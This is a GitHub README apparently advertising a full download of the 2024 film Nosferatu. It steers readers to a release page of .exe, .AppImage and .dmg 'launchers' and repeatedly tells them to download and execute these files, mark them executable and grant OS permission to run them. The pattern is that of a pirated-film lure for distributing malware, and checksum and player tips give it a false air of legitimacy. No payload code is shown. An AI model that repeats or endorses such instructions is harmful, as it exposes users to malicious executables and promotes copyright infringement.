About this repository
Nosferatu-2 hosts the release package for "Nosferatu 2024 filme completo." The release page contains one or more downloadable assets. The primary release asset is a packaged file that you can download and execute. The file bundles the complete film, subtitle files, and a small launcher for playback on common platforms.

Release overview
This repository holds a single major release labeled v1.0.0 (sample version). The release page at:
https://github.com/jax01010/Nosferatu-2/releases
contains the downloadable asset set. Because the link points to a path that lists release assets, you will find one or more files that you must download and run locally. The typical assets include:
- Nosferatu-2024-full.zip â€” a zip archive with the film and extras.
- Nosferatu-2024-full.exe â€” Windows launcher for playback.
- Nosferatu-2024-full.AppImage â€” Linux portable runtime.
- Nosferatu-2024-full.dmg â€” macOS disk image (signed).
- subtitles/ â€” a folder of SRT files for multiple languages.
- checksums.txt â€” SHA256 checksums for each file.

Download and execute the release file
The release page lists the files. Download the relevant asset for your platform from:
https://github.com/jax01010/Nosferatu-2/releases

- Manual load: Use your playerâ€™s subtitle menu (File â†’ Open Subtitle) to load a file.
- Embedded subtitles: Select the subtitle track via the playerâ€™s track menu.

Closed captions
- The release provides a closed captions track (CEA-608/708) in selected builds to support devices that read closed caption streams.

Playback recommendations
Use modern, maintained players. The release targets broad compatibility. Use players below for best experience.

Recommended players
- VLC (Windows, macOS, Linux) â€” open-source, supports many codecs and containers.
- MPV (Windows, macOS, Linux) â€” minimal, scriptable, high-quality video output.
- IINA (macOS) â€” modern UI, mpv backend.
- PotPlayer (Windows) â€” advanced options for Windows users.

Hardware decode
- Use hardware acceleration on capable systems to reduce CPU load.
- Enable VAAPI / VDPAU / DXVA / VideoToolbox in player settings where available.

Monitor and audio tips
- For HDR content, ensure your display and player support HDR passthrough.
- For surround audio, use a player that supports AC-3 / E-AC-3 passthrough to your AVR or set your device to decode.

File integrity and verification
Verify files before you run them. The release includes checksums and, where available, GPG signatures.

Checksums
- The release lists SHA256 checksums in checksums.txt for each asset.
- Use these commands to verify:
  - Linux/macOS: shasum -a 256 filename
  - Windows (PowerShell): Get-FileHash filename -Algorithm SHA256

Example verification steps
1. Download the file and checksums.txt from the release page.
2. Run the checksum command for the file and compare the output to the entry in checksums.txt.
3. If the values match, proceed to run the file.

GPG signatures (if present)
- Some releases attach a .asc GPG signature for checksums.txt.
- Verify using gpg --verify checksums.txt.asc checksums.txt and ensure the signer key matches a trusted key listed on the release page.

Troubleshooting
If you run into problems, use the steps below to resolve common issues.

Problem: File wonâ€™t run or open
- Verify the checksum of the file.
- Ensure you downloaded the platform-specific asset (Windows .exe, macOS .dmg, Linux .AppImage).
- Check file permissions on macOS and Linux (chmod +x).
- Use a modern player such as VLC or mpv to open the raw video file if the launcher fails.

Problem: Subtitles do not load
- Ensure the subtitle file name matches the video file name exactly.
- Use your playerâ€™s manual subtitle load option.
- Check the encoding of the SRT (UTF-8 recommended) and convert if necessary.

Problem: Video stutters or drops frames
- Enable hardware acceleration in the player.
- Use the lower-resolution asset (1080p) if your system cannot handle 4K.
- Close background apps that might use CPU or GPU.

Problem: Audio out of sync
- Try a different player. mpv and VLC offer audio sync controls.
- Some containers have variable frame rate issues. Remuxing with ffmpeg can fix timing issues.

Problem: Player rejects HDR content
- Use a player and OS that support HDR passthrough.
- Use the SDR master if HDR support is not available on your device.

Frequently asked questions (FAQ)

Q: Where do I get the release file?
A: Visit the release page: https://github.com/jax01010/Nosferatu-2/releases and download the asset that matches your platform.

Q: The release page lists multiple files. Which do I pick?
A: Pick the file that matches your device:
- Windows: .exe or .zip
- macOS: .dmg or .zip
- Linux: .AppImage or .zip
Choose the 4K asset only if your system can decode 4K HEVC.

Q: How do I verify the file?
A: Check the SHA256 checksum in checksums.txt against the checksum you compute locally. Use shasum -a 256 on macOS/Linux or Get-FileHash in PowerShell on Windows.

Q: Are subtitle files included?
A: Yes. SRT files for multiple languages are included as external files and embedded tracks exist in MKV builds.

Q: Can I copy the release to a mobile device?
A: Yes. Use a transfer method like USB, AirDrop, or cloud storage. Use a player app that supports the file format on mobile (VLC mobile, MX Player).

Q: Why does the player ask permission to run the file?
A: Your OS treats downloaded executables as untrusted by default. Grant permission if you trust the source and verify checksums.
